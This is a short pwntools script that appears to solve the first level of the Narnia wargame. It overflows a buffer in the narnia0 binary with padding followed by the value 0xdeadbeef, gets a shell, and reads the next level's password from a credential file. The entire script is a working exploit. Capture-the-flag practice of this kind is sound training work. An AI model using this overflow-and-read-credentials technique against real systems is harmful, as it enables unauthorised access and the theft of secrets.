from pwn import *

p = process('/narnia/narnia0')

p.clean()
p.sendline(b'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde')
p.recvuntil(b'$')
p.sendline(b'cat /etc/narnia_pass/narnia1')
print('\nnarnia1 pass: ' + p.recvline().decode())

p.close()
